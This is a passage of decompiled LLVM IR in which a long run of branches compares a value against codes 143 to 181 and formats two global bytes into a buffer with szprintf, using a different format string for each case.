  %v4_c744 = sext i8 %v3_c72c to i32
  %v6_c744 = sext i8 %v3_c738 to i32
  %v8_c744 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20178.347 to i32), i32 %v4_c744, i32 %v6_c744, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c748

dec_label_pc_c748:                                ; preds = %dec_label_pc_c714, %dec_label_pc_c720
  %v7_c74c = icmp eq i32 %v2_a7e0, 143
  br i1 %v7_c74c, label %dec_label_pc_c754, label %dec_label_pc_c77c

dec_label_pc_c754:                                ; preds = %dec_label_pc_c748
  %v3_c760 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c76c = load i8, i8* @global_var_2e472.72, align 1
  %v4_c778 = sext i8 %v3_c760 to i32
  %v6_c778 = sext i8 %v3_c76c to i32
  %v8_c778 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20068.313 to i32), i32 %v4_c778, i32 %v6_c778, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c77c

dec_label_pc_c77c:                                ; preds = %dec_label_pc_c748, %dec_label_pc_c754
  %v7_c780 = icmp eq i32 %v2_a7e0, 144
  br i1 %v7_c780, label %dec_label_pc_c788, label %dec_label_pc_c7b0

dec_label_pc_c788:                                ; preds = %dec_label_pc_c77c
  %v3_c794 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c7a0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c7ac = sext i8 %v3_c794 to i32
  %v6_c7ac = sext i8 %v3_c7a0 to i32
  %v8_c7ac = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20188.349 to i32), i32 %v4_c7ac, i32 %v6_c7ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7b0

dec_label_pc_c7b0:                                ; preds = %dec_label_pc_c77c, %dec_label_pc_c788
  %v7_c7b4 = icmp eq i32 %v2_a7e0, 145
  br i1 %v7_c7b4, label %dec_label_pc_c7bc, label %dec_label_pc_c7e4

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c7b0
  %v3_c7c8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c7d4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c7e0 = sext i8 %v3_c7c8 to i32
  %v6_c7e0 = sext i8 %v3_c7d4 to i32
  %v8_c7e0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20198.351 to i32), i32 %v4_c7e0, i32 %v6_c7e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7e4

dec_label_pc_c7e4:                                ; preds = %dec_label_pc_c7b0, %dec_label_pc_c7bc
  %v7_c7e8 = icmp eq i32 %v2_a7e0, 146
  br i1 %v7_c7e8, label %dec_label_pc_c7f0, label %dec_label_pc_c818

dec_label_pc_c7f0:                                ; preds = %dec_label_pc_c7e4
  %v3_c7fc = load i8, i8* @global_var_2e471.71, align 1
  %v3_c808 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c814 = sext i8 %v3_c7fc to i32
  %v6_c814 = sext i8 %v3_c808 to i32
  %v8_c814 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_201a8.353 to i32), i32 %v4_c814, i32 %v6_c814, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c818

dec_label_pc_c818:                                ; preds = %dec_label_pc_c7e4, %dec_label_pc_c7f0
  %v7_c81c = icmp eq i32 %v2_a7e0, 147
  br i1 %v7_c81c, label %dec_label_pc_c824, label %dec_label_pc_c84c

dec_label_pc_c824:                                ; preds = %dec_label_pc_c818
  %v3_c830 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c83c = load i8, i8* @global_var_2e472.72, align 1
  %v4_c848 = sext i8 %v3_c830 to i32
  %v6_c848 = sext i8 %v3_c83c to i32
  %v8_c848 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_201b8.355 to i32), i32 %v4_c848, i32 %v6_c848, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c84c

dec_label_pc_c84c:                                ; preds = %dec_label_pc_c818, %dec_label_pc_c824
  %v7_c850 = icmp eq i32 %v2_a7e0, 148
  br i1 %v7_c850, label %dec_label_pc_c858, label %dec_label_pc_c880

dec_label_pc_c858:                                ; preds = %dec_label_pc_c84c
  %v3_c864 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c870 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c87c = sext i8 %v3_c864 to i32
  %v6_c87c = sext i8 %v3_c870 to i32
  %v8_c87c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_201c8.357 to i32), i32 %v4_c87c, i32 %v6_c87c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c880

dec_label_pc_c880:                                ; preds = %dec_label_pc_c84c, %dec_label_pc_c858
  %v7_c884 = icmp eq i32 %v2_a7e0, 149
  br i1 %v7_c884, label %dec_label_pc_c88c, label %dec_label_pc_c8b4

dec_label_pc_c88c:                                ; preds = %dec_label_pc_c880
  %v3_c898 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c8a4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c8b0 = sext i8 %v3_c898 to i32
  %v6_c8b0 = sext i8 %v3_c8a4 to i32
  %v8_c8b0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_201d8.359 to i32), i32 %v4_c8b0, i32 %v6_c8b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8b4

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c880, %dec_label_pc_c88c
  %v7_c8b8 = icmp eq i32 %v2_a7e0, 150
  br i1 %v7_c8b8, label %dec_label_pc_c8c0, label %dec_label_pc_c8e8

dec_label_pc_c8c0:                                ; preds = %dec_label_pc_c8b4
  %v3_c8cc = load i8, i8* @global_var_2e471.71, align 1
  %v3_c8d8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c8e4 = sext i8 %v3_c8cc to i32
  %v6_c8e4 = sext i8 %v3_c8d8 to i32
  %v8_c8e4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_201e8.361 to i32), i32 %v4_c8e4, i32 %v6_c8e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8e8

dec_label_pc_c8e8:                                ; preds = %dec_label_pc_c8b4, %dec_label_pc_c8c0
  %v7_c8ec = icmp eq i32 %v2_a7e0, 151
  br i1 %v7_c8ec, label %dec_label_pc_c8f4, label %dec_label_pc_c91c

dec_label_pc_c8f4:                                ; preds = %dec_label_pc_c8e8
  %v3_c900 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c90c = load i8, i8* @global_var_2e472.72, align 1
  %v4_c918 = sext i8 %v3_c900 to i32
  %v6_c918 = sext i8 %v3_c90c to i32
  %v8_c918 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_201f8.363 to i32), i32 %v4_c918, i32 %v6_c918, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c91c

dec_label_pc_c91c:                                ; preds = %dec_label_pc_c8e8, %dec_label_pc_c8f4
  %v7_c920 = icmp eq i32 %v2_a7e0, 152
  br i1 %v7_c920, label %dec_label_pc_c928, label %dec_label_pc_c950

dec_label_pc_c928:                                ; preds = %dec_label_pc_c91c
  %v3_c934 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c940 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c94c = sext i8 %v3_c934 to i32
  %v6_c94c = sext i8 %v3_c940 to i32
  %v8_c94c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1ffdc.295 to i32), i32 %v4_c94c, i32 %v6_c94c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c950

dec_label_pc_c950:                                ; preds = %dec_label_pc_c91c, %dec_label_pc_c928
  %v7_c954 = icmp eq i32 %v2_a7e0, 153
  br i1 %v7_c954, label %dec_label_pc_c95c, label %dec_label_pc_c984

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c950
  %v3_c968 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c974 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c980 = sext i8 %v3_c968 to i32
  %v6_c980 = sext i8 %v3_c974 to i32
  %v8_c980 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20208.366 to i32), i32 %v4_c980, i32 %v6_c980, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c984

dec_label_pc_c984:                                ; preds = %dec_label_pc_c950, %dec_label_pc_c95c
  %v7_c988 = icmp eq i32 %v2_a7e0, 154
  br i1 %v7_c988, label %dec_label_pc_c990, label %dec_label_pc_c9b8

dec_label_pc_c990:                                ; preds = %dec_label_pc_c984
  %v3_c99c = load i8, i8* @global_var_2e471.71, align 1
  %v3_c9a8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_c9b4 = sext i8 %v3_c99c to i32
  %v6_c9b4 = sext i8 %v3_c9a8 to i32
  %v8_c9b4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20218.368 to i32), i32 %v4_c9b4, i32 %v6_c9b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9b8

dec_label_pc_c9b8:                                ; preds = %dec_label_pc_c984, %dec_label_pc_c990
  %v7_c9bc = icmp eq i32 %v2_a7e0, 155
  br i1 %v7_c9bc, label %dec_label_pc_c9c4, label %dec_label_pc_c9ec

dec_label_pc_c9c4:                                ; preds = %dec_label_pc_c9b8
  %v3_c9d0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_c9dc = load i8, i8* @global_var_2e472.72, align 1
  %v4_c9e8 = sext i8 %v3_c9d0 to i32
  %v6_c9e8 = sext i8 %v3_c9dc to i32
  %v8_c9e8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20228.370 to i32), i32 %v4_c9e8, i32 %v6_c9e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9ec

dec_label_pc_c9ec:                                ; preds = %dec_label_pc_c9b8, %dec_label_pc_c9c4
  %v7_c9f0 = icmp eq i32 %v2_a7e0, 156
  br i1 %v7_c9f0, label %dec_label_pc_c9f8, label %dec_label_pc_ca20

dec_label_pc_c9f8:                                ; preds = %dec_label_pc_c9ec
  %v3_ca04 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ca10 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ca1c = sext i8 %v3_ca04 to i32
  %v6_ca1c = sext i8 %v3_ca10 to i32
  %v8_ca1c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20238.372 to i32), i32 %v4_ca1c, i32 %v6_ca1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca20

dec_label_pc_ca20:                                ; preds = %dec_label_pc_c9ec, %dec_label_pc_c9f8
  %v7_ca24 = icmp eq i32 %v2_a7e0, 157
  br i1 %v7_ca24, label %dec_label_pc_ca2c, label %dec_label_pc_ca54

dec_label_pc_ca2c:                                ; preds = %dec_label_pc_ca20
  %v3_ca38 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ca44 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ca50 = sext i8 %v3_ca38 to i32
  %v6_ca50 = sext i8 %v3_ca44 to i32
  %v8_ca50 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20248.374 to i32), i32 %v4_ca50, i32 %v6_ca50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca54

dec_label_pc_ca54:                                ; preds = %dec_label_pc_ca20, %dec_label_pc_ca2c
  %v7_ca58 = icmp eq i32 %v2_a7e0, 158
  br i1 %v7_ca58, label %dec_label_pc_ca60, label %dec_label_pc_ca88

dec_label_pc_ca60:                                ; preds = %dec_label_pc_ca54
  %v3_ca6c = load i8, i8* @global_var_2e471.71, align 1
  %v3_ca78 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ca84 = sext i8 %v3_ca6c to i32
  %v6_ca84 = sext i8 %v3_ca78 to i32
  %v8_ca84 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_20258.376 to i32), i32 %v4_ca84, i32 %v6_ca84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca88

dec_label_pc_ca88:                                ; preds = %dec_label_pc_ca54, %dec_label_pc_ca60
  %v7_ca8c = icmp eq i32 %v2_a7e0, 159
  br i1 %v7_ca8c, label %dec_label_pc_ca94, label %dec_label_pc_cabc

dec_label_pc_ca94:                                ; preds = %dec_label_pc_ca88
  %v3_caa0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_caac = load i8, i8* @global_var_2e472.72, align 1
  %v4_cab8 = sext i8 %v3_caa0 to i32
  %v6_cab8 = sext i8 %v3_caac to i32
  %v8_cab8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20264.378 to i32), i32 %v4_cab8, i32 %v6_cab8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %dec_label_pc_ca88, %dec_label_pc_ca94
  %v7_cac0 = icmp eq i32 %v2_a7e0, 160
  br i1 %v7_cac0, label %dec_label_pc_cac8, label %dec_label_pc_caf0

dec_label_pc_cac8:                                ; preds = %dec_label_pc_cabc
  %v3_cad4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cae0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_caec = sext i8 %v3_cad4 to i32
  %v6_caec = sext i8 %v3_cae0 to i32
  %v8_caec = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20274.380 to i32), i32 %v4_caec, i32 %v6_caec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cabc, %dec_label_pc_cac8
  %v7_caf4 = icmp eq i32 %v2_a7e0, 161
  br i1 %v7_caf4, label %dec_label_pc_cafc, label %dec_label_pc_cb24

dec_label_pc_cafc:                                ; preds = %dec_label_pc_caf0
  %v3_cb08 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cb14 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cb20 = sext i8 %v3_cb08 to i32
  %v6_cb20 = sext i8 %v3_cb14 to i32
  %v8_cb20 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20284.382 to i32), i32 %v4_cb20, i32 %v6_cb20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb24

dec_label_pc_cb24:                                ; preds = %dec_label_pc_caf0, %dec_label_pc_cafc
  %v7_cb28 = icmp eq i32 %v2_a7e0, 162
  br i1 %v7_cb28, label %dec_label_pc_cb30, label %dec_label_pc_cb58

dec_label_pc_cb30:                                ; preds = %dec_label_pc_cb24
  %v3_cb3c = load i8, i8* @global_var_2e471.71, align 1
  %v3_cb48 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cb54 = sext i8 %v3_cb3c to i32
  %v6_cb54 = sext i8 %v3_cb48 to i32
  %v8_cb54 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20294.384 to i32), i32 %v4_cb54, i32 %v6_cb54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb58

dec_label_pc_cb58:                                ; preds = %dec_label_pc_cb24, %dec_label_pc_cb30
  %v7_cb5c = icmp eq i32 %v2_a7e0, 163
  br i1 %v7_cb5c, label %dec_label_pc_cb64, label %dec_label_pc_cb8c

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cb58
  %v3_cb70 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cb7c = load i8, i8* @global_var_2e472.72, align 1
  %v4_cb88 = sext i8 %v3_cb70 to i32
  %v6_cb88 = sext i8 %v3_cb7c to i32
  %v8_cb88 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_202a4.386 to i32), i32 %v4_cb88, i32 %v6_cb88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb8c

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb58, %dec_label_pc_cb64
  %v7_cb90 = icmp eq i32 %v2_a7e0, 164
  br i1 %v7_cb90, label %dec_label_pc_cb98, label %dec_label_pc_cbc0

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb8c
  %v3_cba4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cbb0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cbbc = sext i8 %v3_cba4 to i32
  %v6_cbbc = sext i8 %v3_cbb0 to i32
  %v8_cbbc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_201f8.363 to i32), i32 %v4_cbbc, i32 %v6_cbbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbc0

dec_label_pc_cbc0:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb98
  %v7_cbc4 = icmp eq i32 %v2_a7e0, 165
  br i1 %v7_cbc4, label %dec_label_pc_cbcc, label %dec_label_pc_cbf4

dec_label_pc_cbcc:                                ; preds = %dec_label_pc_cbc0
  %v3_cbd8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cbe4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cbf0 = sext i8 %v3_cbd8 to i32
  %v6_cbf0 = sext i8 %v3_cbe4 to i32
  %v8_cbf0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_202b4.389 to i32), i32 %v4_cbf0, i32 %v6_cbf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbf4

dec_label_pc_cbf4:                                ; preds = %dec_label_pc_cbc0, %dec_label_pc_cbcc
  %v7_cbf8 = icmp eq i32 %v2_a7e0, 166
  br i1 %v7_cbf8, label %dec_label_pc_cc00, label %dec_label_pc_cc28

dec_label_pc_cc00:                                ; preds = %dec_label_pc_cbf4
  %v3_cc0c = load i8, i8* @global_var_2e471.71, align 1
  %v3_cc18 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cc24 = sext i8 %v3_cc0c to i32
  %v6_cc24 = sext i8 %v3_cc18 to i32
  %v8_cc24 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_202c4.391 to i32), i32 %v4_cc24, i32 %v6_cc24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc28

dec_label_pc_cc28:                                ; preds = %dec_label_pc_cbf4, %dec_label_pc_cc00
  %v7_cc2c = icmp eq i32 %v2_a7e0, 167
  br i1 %v7_cc2c, label %dec_label_pc_cc34, label %dec_label_pc_cc5c

dec_label_pc_cc34:                                ; preds = %dec_label_pc_cc28
  %v3_cc40 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cc4c = load i8, i8* @global_var_2e472.72, align 1
  %v4_cc58 = sext i8 %v3_cc40 to i32
  %v6_cc58 = sext i8 %v3_cc4c to i32
  %v8_cc58 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20264.378 to i32), i32 %v4_cc58, i32 %v6_cc58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc5c

dec_label_pc_cc5c:                                ; preds = %dec_label_pc_cc28, %dec_label_pc_cc34
  %v7_cc60 = icmp eq i32 %v2_a7e0, 168
  br i1 %v7_cc60, label %dec_label_pc_cc68, label %dec_label_pc_cc90

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc5c
  %v3_cc74 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cc80 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cc8c = sext i8 %v3_cc74 to i32
  %v6_cc8c = sext i8 %v3_cc80 to i32
  %v8_cc8c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_202d4.393 to i32), i32 %v4_cc8c, i32 %v6_cc8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc90

dec_label_pc_cc90:                                ; preds = %dec_label_pc_cc5c, %dec_label_pc_cc68
  %v7_cc94 = icmp eq i32 %v2_a7e0, 169
  br i1 %v7_cc94, label %dec_label_pc_cc9c, label %dec_label_pc_ccc4

dec_label_pc_cc9c:                                ; preds = %dec_label_pc_cc90
  %v3_cca8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ccb4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ccc0 = sext i8 %v3_cca8 to i32
  %v6_ccc0 = sext i8 %v3_ccb4 to i32
  %v8_ccc0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_202e4.395 to i32), i32 %v4_ccc0, i32 %v6_ccc0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccc4

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_cc90, %dec_label_pc_cc9c
  %v7_ccc8 = icmp eq i32 %v2_a7e0, 171
  br i1 %v7_ccc8, label %dec_label_pc_ccd0, label %dec_label_pc_ccf8

dec_label_pc_ccd0:                                ; preds = %dec_label_pc_ccc4
  %v3_ccdc = load i8, i8* @global_var_2e471.71, align 1
  %v3_cce8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ccf4 = sext i8 %v3_ccdc to i32
  %v6_ccf4 = sext i8 %v3_cce8 to i32
  %v8_ccf4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_202f4.397 to i32), i32 %v4_ccf4, i32 %v6_ccf4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccf8

dec_label_pc_ccf8:                                ; preds = %dec_label_pc_ccc4, %dec_label_pc_ccd0
  %v7_ccfc = icmp eq i32 %v2_a7e0, 172
  br i1 %v7_ccfc, label %dec_label_pc_cd04, label %dec_label_pc_cd2c

dec_label_pc_cd04:                                ; preds = %dec_label_pc_ccf8
  %v3_cd10 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cd1c = load i8, i8* @global_var_2e472.72, align 1
  %v4_cd28 = sext i8 %v3_cd10 to i32
  %v6_cd28 = sext i8 %v3_cd1c to i32
  %v8_cd28 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20304.399 to i32), i32 %v4_cd28, i32 %v6_cd28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd2c

dec_label_pc_cd2c:                                ; preds = %dec_label_pc_ccf8, %dec_label_pc_cd04
  %v7_cd30 = icmp eq i32 %v2_a7e0, 173
  br i1 %v7_cd30, label %dec_label_pc_cd38, label %dec_label_pc_cd60

dec_label_pc_cd38:                                ; preds = %dec_label_pc_cd2c
  %v3_cd44 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cd50 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cd5c = sext i8 %v3_cd44 to i32
  %v6_cd5c = sext i8 %v3_cd50 to i32
  %v8_cd5c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20314.401 to i32), i32 %v4_cd5c, i32 %v6_cd5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd60

dec_label_pc_cd60:                                ; preds = %dec_label_pc_cd2c, %dec_label_pc_cd38
  %v7_cd64 = icmp eq i32 %v2_a7e0, 174
  br i1 %v7_cd64, label %dec_label_pc_cd6c, label %dec_label_pc_cd94

dec_label_pc_cd6c:                                ; preds = %dec_label_pc_cd60
  %v3_cd78 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cd84 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cd90 = sext i8 %v3_cd78 to i32
  %v6_cd90 = sext i8 %v3_cd84 to i32
  %v8_cd90 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20324.403 to i32), i32 %v4_cd90, i32 %v6_cd90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd94

dec_label_pc_cd94:                                ; preds = %dec_label_pc_cd60, %dec_label_pc_cd6c
  %v7_cd98 = icmp eq i32 %v2_a7e0, 175
  br i1 %v7_cd98, label %dec_label_pc_cda0, label %dec_label_pc_cdc8

dec_label_pc_cda0:                                ; preds = %dec_label_pc_cd94
  %v3_cdac = load i8, i8* @global_var_2e471.71, align 1
  %v3_cdb8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cdc4 = sext i8 %v3_cdac to i32
  %v6_cdc4 = sext i8 %v3_cdb8 to i32
  %v8_cdc4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20334.405 to i32), i32 %v4_cdc4, i32 %v6_cdc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdc8

dec_label_pc_cdc8:                                ; preds = %dec_label_pc_cd94, %dec_label_pc_cda0
  %v7_cdcc = icmp eq i32 %v2_a7e0, 176
  br i1 %v7_cdcc, label %dec_label_pc_cdd4, label %dec_label_pc_cdfc

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cdc8
  %v3_cde0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cdec = load i8, i8* @global_var_2e472.72, align 1
  %v4_cdf8 = sext i8 %v3_cde0 to i32
  %v6_cdf8 = sext i8 %v3_cdec to i32
  %v8_cdf8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20344.407 to i32), i32 %v4_cdf8, i32 %v6_cdf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdfc

dec_label_pc_cdfc:                                ; preds = %dec_label_pc_cdc8, %dec_label_pc_cdd4
  %v7_ce00 = icmp eq i32 %v2_a7e0, 177
  br i1 %v7_ce00, label %dec_label_pc_ce08, label %dec_label_pc_ce30

dec_label_pc_ce08:                                ; preds = %dec_label_pc_cdfc
  %v3_ce14 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ce20 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ce2c = sext i8 %v3_ce14 to i32
  %v6_ce2c = sext i8 %v3_ce20 to i32
  %v8_ce2c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20354.409 to i32), i32 %v4_ce2c, i32 %v6_ce2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce30

dec_label_pc_ce30:                                ; preds = %dec_label_pc_cdfc, %dec_label_pc_ce08
  %v7_ce34 = icmp eq i32 %v2_a7e0, 178
  br i1 %v7_ce34, label %dec_label_pc_ce3c, label %dec_label_pc_ce64

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_ce30
  %v3_ce48 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ce54 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ce60 = sext i8 %v3_ce48 to i32
  %v6_ce60 = sext i8 %v3_ce54 to i32
  %v8_ce60 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20364.411 to i32), i32 %v4_ce60, i32 %v6_ce60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce64

dec_label_pc_ce64:                                ; preds = %dec_label_pc_ce30, %dec_label_pc_ce3c
  %v7_ce68 = icmp eq i32 %v2_a7e0, 179
  br i1 %v7_ce68, label %dec_label_pc_ce70, label %dec_label_pc_ce98

dec_label_pc_ce70:                                ; preds = %dec_label_pc_ce64
  %v3_ce7c = load i8, i8* @global_var_2e471.71, align 1
  %v3_ce88 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ce94 = sext i8 %v3_ce7c to i32
  %v6_ce94 = sext i8 %v3_ce88 to i32
  %v8_ce94 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20374.413 to i32), i32 %v4_ce94, i32 %v6_ce94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce98

dec_label_pc_ce98:                                ; preds = %dec_label_pc_ce64, %dec_label_pc_ce70
  %v7_ce9c = icmp eq i32 %v2_a7e0, 180
  br i1 %v7_ce9c, label %dec_label_pc_cea4, label %dec_label_pc_cecc

dec_label_pc_cea4:                                ; preds = %dec_label_pc_ce98
  %v3_ceb0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cebc = load i8, i8* @global_var_2e472.72, align 1
  %v4_cec8 = sext i8 %v3_ceb0 to i32
  %v6_cec8 = sext i8 %v3_cebc to i32
  %v8_cec8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20384.415 to i32), i32 %v4_cec8, i32 %v6_cec8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cecc

dec_label_pc_cecc:                                ; preds = %dec_label_pc_ce98, %dec_label_pc_cea4
  %v7_ced0 = icmp eq i32 %v2_a7e0, 181
  br i1 %v7_ced0, label %dec_label_pc_ced8, label %dec_label_pc_cf00

dec_label_pc_ced8:                                ; preds = %dec_label_pc_cecc
  %v3_cee4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cef0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cefc = sext i8 %v3_cee4 to i32
  %v6_cefc = sext i8 %v3_cef0 to i32
  %v8_cefc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20394.417 to i32), i32 %v4_cefc, i32 %v6_cefc, i32 ptrtoint (i32* @0 to i32))
